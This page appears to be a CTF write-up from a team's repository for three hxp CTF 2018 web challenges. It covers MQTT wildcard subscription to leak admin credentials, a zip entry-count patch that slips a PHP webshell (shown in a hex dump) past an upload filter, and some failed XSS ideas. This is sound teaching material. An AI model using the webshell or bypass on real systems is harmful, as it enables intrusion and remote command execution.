@@ -1,0 +1,267 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>hxp CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#time-for-h4x0rpsch0rr?">time-for-h4x0rpsch0rr?</a>
+    
+                <a class="dropdown-item" href="#unpack0r">unpack0r</a>
+    
+                <a class="dropdown-item" href="#µblog">µblog</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#time-for-h4x0rpsch0rr?" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">time-for-h4x0rpsch0rr?</span>
+            </a>
+    
+<a href="#unpack0r" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">unpack0r</span>
+            </a>
+    
+<a href="#µblog" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">µblog</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="hxp-ctf-2018"><a class="header-link" href="#hxp-ctf-2018"></a>hxp CTF 2018</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="time-for-h4x0rpsch0rr?"><a class="header-link" href="#time-for-h4x0rpsch0rr?"></a>time for h4x0rpsch0rr?</h3>
+<p>bookgin</p>
+<p>The website uses MQTT websocket to receive the temperature.</p>
+<pre class="hljs"><code>...
+
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"mqtt.min.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
+  <span class="hljs-keyword">var</span> client = mqtt.connect(<span class="hljs-string">'ws://159.69.212.240:60805'</span>)
+  client.subscribe(<span class="hljs-string">'hxp.io/temperature/Munich'</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>And there is admin panel, but username, password and OTP are required to login.</p>
+<p>Let&#39;s take a look at the <a href="https://www.hivemq.com/blog/mqtt-essentials-part-5-mqtt-topics-best-practices/">document</a>. It does support wildcard charcaters.</p>
+<blockquote>
+<p>If you specify only the multi-level wildcard as a topic (#), you receive all messages that are sent to the MQTT broker.</p>
+</blockquote>
+<p>I try to subscribe <code>#</code>, but no other messages are received. In the document, topics beginning with <code>$</code>  are not part of the subscription when you subscribe to the multi-level wildcard as a topic (#). </p>
+<p>Next is to subscribe <code>$SYS/#</code>. Bingo! I receive the message from <code>$internal/admin/webcam</code> channel. The message is actually an image. Decoding this image we will get admin&#39;s username, password and OTP. Login to the admin panel and get the flag. Note that the OTP will change in a few seconds.</p>
+<pre class="hljs"><code>curl <span class="hljs-string">'http://159.69.212.240:8001/admin.php'</span> <span class="hljs-_">-d</span> <span class="hljs-string">'user=iot_fag&amp;password=I&lt;3SecurID&amp;otp=861729'</span> <span class="hljs-_">-s</span>D -</code></pre><h3 id="unpack0r"><a class="header-link" href="#unpack0r"></a>unpack0r</h3>
+<p>bookgin</p>
+<p>For the server side source code, please refer to <a href="https://graneed.hatenablog.com/entry/2018/12/09/220317">writeup by graneed</a>.</p>
+<p>Basically, the server will unzip the file. However, the filename can only contain a-z. We cannot directly upload a webshell or <code>.htaccess</code>. </p>
+<p>The most notable thing here is the server uses php zip to check the filename, but it uses linux <code>unzip</code> to decompress the file. It&#39;s possible we can take advantage of this inconsistency. In the source, it uses php <code>zip-&gt;numFiles</code> and iterates each file to check the filename. What if we can make <code>zip-&gt;numFiles</code> return a incorrect number? So the plan is</p>
+<ol class="list">
+<li>zip a webshell <code>shell.php</code></li>
+<li>Make <code>zip-&gt;numFiles</code> return 0.</li>
+<li>The zip file can still be decompressed by linux <code>unzip</code>.</li>
+</ol>
+<p>Here is a <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">great document</a> describing the ZIP file format. in the end of central directory record, there are two attributes <code>Disk entry</code> and <code>Total entry</code>. Just patch number to zero (0x00) and we can upload the webshell.</p>
+<pre class="hljs"><code>$ xxd a.zip
+<span class="hljs-number">00000000</span>: <span class="hljs-number">504</span>b <span class="hljs-number">0304</span> <span class="hljs-number">0</span>a00 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">765</span>a <span class="hljs-number">884</span>d <span class="hljs-number">256</span>d  PK........vZ.M%m
+<span class="hljs-number">00000010</span>: ec8c <span class="hljs-number">1800</span> <span class="hljs-number">0000</span> <span class="hljs-number">1800</span> <span class="hljs-number">0000</span> <span class="hljs-number">0900</span> <span class="hljs-number">1</span>c00 <span class="hljs-number">6161</span>  ..............aa
+<span class="hljs-number">00000020</span>: <span class="hljs-number">6161</span> <span class="hljs-number">612</span>e <span class="hljs-number">7068</span> <span class="hljs-number">7055</span> <span class="hljs-number">5409</span> <span class="hljs-number">0003</span> <span class="hljs-number">20</span>ef <span class="hljs-number">0</span>b5c  aaa.phpUT... ..\
+<span class="hljs-number">00000030</span>: <span class="hljs-number">20</span>ef <span class="hljs-number">0</span>b5c <span class="hljs-number">7578</span> <span class="hljs-number">0</span>b00 <span class="hljs-number">0104</span> e803 <span class="hljs-number">0000</span> <span class="hljs-number">04e8</span>   ..\ux..........
+<span class="hljs-number">00000040</span>: <span class="hljs-number">0300</span> <span class="hljs-number">003</span>c <span class="hljs-number">3</span>f70 <span class="hljs-number">6870</span> <span class="hljs-number">0</span>a73 <span class="hljs-number">7973</span> <span class="hljs-number">7465</span> <span class="hljs-number">6</span>d28  ...&lt;?php.<span class="hljs-keyword">system</span>(
+<span class="hljs-number">00000050</span>: <span class="hljs-number">245</span>f <span class="hljs-number">4745</span> <span class="hljs-number">545</span>b <span class="hljs-number">5</span>f5d <span class="hljs-number">293</span>b <span class="hljs-number">0</span>a50 <span class="hljs-number">4</span>b01 <span class="hljs-number">021</span>e  $_GET[_]);.PK...
+<span class="hljs-number">00000060</span>: <span class="hljs-number">030</span>a <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0076</span> <span class="hljs-number">5</span>a88 <span class="hljs-number">4</span>d25 <span class="hljs-number">6</span>dec <span class="hljs-number">8</span>c18  .......vZ.M%m...
+<span class="hljs-number">00000070</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0018</span> <span class="hljs-number">0000</span> <span class="hljs-number">0009</span> <span class="hljs-number">0018</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span>  ................
+<span class="hljs-number">00000080</span>: <span class="hljs-number">0000</span> <span class="hljs-number">00</span>a4 <span class="hljs-number">8100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0061</span> <span class="hljs-number">6161</span> <span class="hljs-number">6161</span> <span class="hljs-number">2e70</span>  .........aaaaa.p
+<span class="hljs-number">00000090</span>: <span class="hljs-number">6870</span> <span class="hljs-number">5554</span> <span class="hljs-number">0500</span> <span class="hljs-number">0320</span> ef0b <span class="hljs-number">5</span>c75 <span class="hljs-number">780</span>b <span class="hljs-number">0001</span>  hpUT... ..\ux...
+<span class="hljs-number">000000</span>a0: <span class="hljs-number">04e8</span> <span class="hljs-number">0300</span> <span class="hljs-number">0004</span> e803 <span class="hljs-number">0000</span> <span class="hljs-number">504</span>b <span class="hljs-number">0506</span> <span class="hljs-number">0000</span>  ..........PK....
+<span class="hljs-number">000000</span>b0: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">4</span>f00 <span class="hljs-number">0000</span> <span class="hljs-number">5</span>b00 <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ......O...[.....</code></pre><h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>zip a symbolic link<ul class="list">
+<li>The server side seems to block symbolic links. It will return 403 Forbidden when trying to access symbolic links.</li>
+</ul>
+</li>
+<li>zip a large number of files<ul class="list">
+<li>There seems to be <a href="http://php.net/manual/en/class.ziparchive.php#116937">a bug</a> when ziping more than 65,535 files. However I cannot reproduce this in PHP 7.2.</li>
+</ul>
+</li>
+<li>Prepend local file header and data<ul class="list">
+<li>The PHP will fail to parse the zip file</li>
+</ul>
+</li>
+</ul>
+<h3 id="µblog"><a class="header-link" href="#µblog"></a>µblog</h3>
+<p>unsolved, bookgin</p>
+<p>Please refer to <a href="https://github.com/lbherrera/writeups/tree/master/hxp-2018/blog">herrera&#39;s writeup</a>. His writeup is very impressive! Also, full credit to the author of the challenge @<em>0xbb</em>. This is definitely one of the best web challenge I&#39;ve seen this year.</p>
+<h4 id="failled-attempts"><a class="header-link" href="#failled-attempts"></a>Failled Attempts</h4>
+<ul class="list">
+<li>XSS in <code>$(location.hash)</code><ul class="list">
+<li><a href="https://bugs.jquery.com/ticket/9521">The bug</a> is fixed in 2012.</li>
+<li>Nowadays the lateest browsers will encode the string in <code>location.hash</code></li>
+</ul>
+</li>
+<li>Leak url thorugh referer<ul class="list">
+<li>It&#39;s totally useless because admin will never visit <code>/?id=ADMIN_ID</code></li>
+<li>In Chrome 70 there is <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=884505&amp;can=1&amp;q=Referrer%20Policy&amp;colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Component%20Status%20Owner%20Summary%20OS%20Modified">bug</a> used to bypass referer policy, but we cannot control the html attributes.</li>
+</ul>
+</li>
+<li>img CSRF<ul class="list">
+<li>However, I can only send GET request in img-src. Nothing can be exploited.</li>
+</ul>
+</li>
+<li><a href="https://github.com/google/security-research-pocs/tree/master/script-gadgets">script gadgets</a><ul class="list">
+<li>We still need somewhere we can inject our XSS, but the page escapes all the html special characters.</li>
+</ul>
+</li>
+</ul>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
